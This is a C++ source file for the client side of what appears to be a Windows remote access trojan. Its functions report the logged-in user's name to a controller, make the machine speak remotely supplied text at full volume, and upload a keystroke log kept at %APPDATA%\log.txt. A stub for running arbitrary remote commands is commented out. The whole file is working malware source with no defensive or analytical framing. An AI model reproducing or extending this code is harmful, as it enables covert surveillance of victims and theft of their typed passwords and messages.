#include "client.h"

void CLIENT::send_username()
{
	char *uname = new char[500];
	DWORD user_len = 500;
	GetUserNameA(uname, &user_len);
	string resp;
	resp.assign(uname);
	send_response(resp);
	delete[] uname;
}

void CLIENT::speak_command(string& data)
{
	ISpVoice * pVoice = NULL;
	CoInitialize(NULL);
	HRESULT hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void **)&pVoice);
	const char* to_speak_char = data.c_str();
	wchar_t* to_speak_unicode = new wchar_t[data.length()+1];
	MultiByteToWideChar(CP_UTF8, 0, to_speak_char, -1, to_speak_unicode, data.length()+1);
	pVoice->SetVolume(100);
	hr = pVoice->Speak(to_speak_unicode, NULL, NULL);
	pVoice->Release();
	CoUninitialize();
}

void CLIENT::dump_keylogs()
{
	char *fipt = new char[1000];
	ExpandEnvironmentStringsA("%APPDATA%", fipt, 1000);
	string keylogs(fipt);
	keylogs.append("\\log.txt");
	send_file(keylogs);
	delete[] fipt;
}

/*
void CLIENT::execute(string& command)
{
	
}
*/